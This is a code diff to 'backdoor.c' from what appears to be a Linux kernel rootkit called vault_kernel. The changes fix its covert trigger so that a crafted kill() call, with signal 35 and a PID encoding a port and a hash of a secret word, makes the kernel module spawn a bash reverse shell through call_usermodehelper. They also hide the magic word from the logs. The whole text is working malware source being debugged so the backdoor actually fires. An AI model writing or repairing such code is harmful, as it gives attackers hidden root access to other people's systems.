@@ -1,6 +1,13 @@
 /* vault_kernel - backdoor.c
  * Kernel backdoor: reverse shell via call_usermodehelper()
- * Magic packet trigger via kill() syscall to PID=SIGRTMIN+1
+ * Magic packet trigger via kill(pid, MAGIC_SIGNAL) where `pid`
+ * encodes: (port << 16) | fnv1a16(magic_word).
+ *
+ * NOTE on MAGIC_SIGNAL: userland `kill(2)` from glibc uses signal
+ * numbers where SIGRTMIN == 34 on x86_64 (glibc reserves 32/33),
+ * so SIGRTMIN+1 arrives at the syscall as 35.  The kernel-side
+ * SIGRTMIN constant is 32 and must NOT be used here — the original
+ * implementation compared against 33 and could never fire.
  * ruby570bocadito © 2026
  */
 #include "core.h"
@@ -8,11 +15,25 @@
 static char magic_str[16] = {0};
 static int magic_enabled = 0;
 
-/* The magic packet: send kill(SIGRTMIN+1, pid) where
- * pid encodes port in the upper 16 bits */
-#define MAGIC_SIGNAL SIGRTMIN + 1
-#define MAGIC_PORT(p) ((p) >> 16)
+/* glibc SIGRTMIN (34) + 1 — the value userspace actually sends */
+#define MAGIC_SIGNAL 35
+#define MAGIC_PORT(p) (((p) >> 16) & 0xFFFF)
 #define MAGIC_FLAG(p) ((p) & 0xFFFF)
+
+/*
+ * FNV-1a 32-bit folded to 16 bits.  MUST stay in sync with the
+ * FNV1a16() implementation in client/go/internal/vaultkernel/ioctl.go
+ * and the Python CLI.
+ */
+uint16_t vault_fnv1a16(const char *s) {
+    uint32_t h = 0x811C9DC5u;
+
+    while (*s) {
+        h ^= (unsigned char)*s++;
+        h *= 0x01000193u;
+    }
+    return (uint16_t)((h >> 16) ^ (h & 0xFFFFu));
+}
 
 static int reverse_shell_spawn(const char *ip, int port) {
     char *argv[] = { "/bin/bash", "-c", NULL, NULL };
@@ -73,33 +94,45 @@ int backdoor_trigger_shell(const char *ip, const char *port_str) {
 int backdoor_set_magic(const char *magic) {
     strncpy(magic_str, magic, sizeof(magic_str) - 1);
     magic_str[sizeof(magic_str) - 1] = '\0';
+    if (!magic_str[0]) {
+        magic_enabled = 0;
+        pr_info(VAULT_KERNEL_TAG " magic packet backdoor disabled\n");
+        return 0;
+    }
     magic_enabled = 1;
-    pr_info(VAULT_KERNEL_TAG " magic packet backdoor enabled: %s\n", magic_str);
+    pr_info(VAULT_KERNEL_TAG " magic packet backdoor enabled (word hash 0x%04x)\n",
+            vault_fnv1a16(magic_str));
     return 0;
 }
 
 /*
  * Check if a kill() call matches the magic packet pattern.
- * Pattern: kill(MAGIC_SIGNAL, <pid>) where pid encodes port.
- * Upper 16 bits of pid = port, lower 16 bits = 0xDEAD
+ * Pattern: kill(pid, 35) where
+ *   pid = (port << 16) | fnv1a16(magic_word)
+ * The word is set with `vault_kernel magic <word>`; the CLI's
+ * `magic-encode <word> <port>` command prints the ready-to-run
+ * kill() incantation.
  */
 int backdoor_check_magic(pid_t pid, int sig) {
+    int port;
+
     if (!magic_enabled)
         return 0;
 
     if (sig != MAGIC_SIGNAL)
         return 0;
 
-    if (MAGIC_FLAG(pid) != 0xDEAD)
+    if (MAGIC_FLAG(pid) != vault_fnv1a16(magic_str))
         return 0;
 
-    {
-        int port = MAGIC_PORT(pid);
-        pr_info(VAULT_KERNEL_TAG " magic packet received, spawning shell on port %d\n", port);
+    port = MAGIC_PORT(pid);
+    if (port < 1 || port > 65535)
+        return 0;
 
-        /* Spawn reverse shell to localhost:port */
-        backdoor_spawn_reverse_shell("127.0.0.1", port);
-    }
+    pr_info(VAULT_KERNEL_TAG " magic packet received, spawning shell on port %d\n", port);
+
+    /* Spawn reverse shell to localhost:port */
+    backdoor_spawn_reverse_shell("127.0.0.1", port);
 
     return 1; /* Signal handled — do not propagate */
 }
